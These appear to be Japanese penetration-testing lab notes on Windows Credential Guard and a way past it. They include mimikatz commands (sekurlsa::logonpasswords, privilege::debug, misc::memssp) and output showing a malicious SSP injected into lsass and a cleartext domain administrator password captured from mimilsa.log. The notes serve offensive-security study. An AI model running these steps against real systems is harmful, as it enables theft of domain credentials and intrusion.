- 非ローカルユーザを保護する仮想セキュリティ機能仕組み
- マシンのローカルユーザの資格情報は取得可能
- 無効になっていた場合はWindowsUpdateなどで更新がかかっても無効のまま
```sh
# CredentialGuardが有効になっている場合
Get-ComputerInfo
# 
# WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
# WindowsCurrentVersion                                   : 6.3
# WindowsEditionId                                        : Enterprise
# ...
# HyperVisorPresent                                       : True
# HyperVRequirementDataExecutionPreventionAvailable       :
# HyperVRequirementSecondLevelAddressTranslation          :
# HyperVRequirementVirtualizationFirmwareEnabled          :
# HyperVRequirementVMMonitorModeExtensions                :
# DeviceGuardSmartStatus                                  : Off
# DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
# DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
# DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3} <- これとか
# DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}     <- これとか
# DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
# DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
```

```sh
# ガードが有効な状態では暗号化されたハッシュしか取得できず使えない
mimikatz # sekurlsa::logonpasswords
# ...
# Authentication Id : 0 ; 4214404 (00000000:00404e84)
# Session           : RemoteInteractive from 4
# User Name         : Administrator
# Domain            : CORP
# Logon Server      : SERVERWK248
# Logon Time        : 9/19/2024 4:39:07 AM
# SID               : S-1-5-21-1711441587-1152167230-1972296030-500
#         msv :
#          [00000003] Primary
#          * Username : Administrator
#          * Domain   : CORP
#            * LSA Isolated Data: NtlmHash 
#              KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
#              Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
#              AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
#              Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
#          * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
#         tspkg :
#         wdigest :       KO
#         kerberos :
#          * Username : Administrator
#          * Domain   : CORP.COM
#          * Password : (null)
#         ssp :
#         credman :
#         cloudap :
# 
```
> 
> このようにキャッシュされた資格情報取得できない場合は、ユーザがログイン中に資格情報を取得すれば良い
> 

### SSPI (Security Support Provider Interface), SSP
- Windowsの提供する認証方式の一つ
- この方式では認証要求はSSPIにルーティングされる
- デフォルトでは以下のSSPを提供 (SSPはDLLとして存在しており、SSPIが認証に必要なSSPを選択)
	- Kerberos SSP
	- NTLM SSP
- SSPは`AddSecurityPackage`というAPIを使用、または`HKLM\System\CurrentControlSet\Control\Lsa\Security Packages`レジストリキーから登録可能
	- lsass.exeはシステム起動のたびに、レジストリキーに登録されたSSP（DLL）を読み込む
- mimikatzの`misc::memssp`コマンドで上記を実現可能

```sh
mimikatz # privilege::debug
# Privilege '20' OK
# 
# lsass.exeのプロセスに悪意のあるSSP(DLL)を挿入
mimikatz # misc::memssp
# Injected =)

# ローカルアカウントではない誰かがログインした場合のシミュレート
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution

# 資格情報のログファイルは保存
cat C:\Windows\System32\mimilsa.log
# [00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00af2311] CORP\Administrator  QWERTY123!@# <- 非ローカルアカウントの資格情報を抽出できた！！
# [00000000:00404e84] CORP\Administrator  Šd
# [00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
# [00000000:00b1dd77] CLIENTWK245\offsec  lab
# [00000000:00b1de21] CLIENTWK245\offsec  lab

```
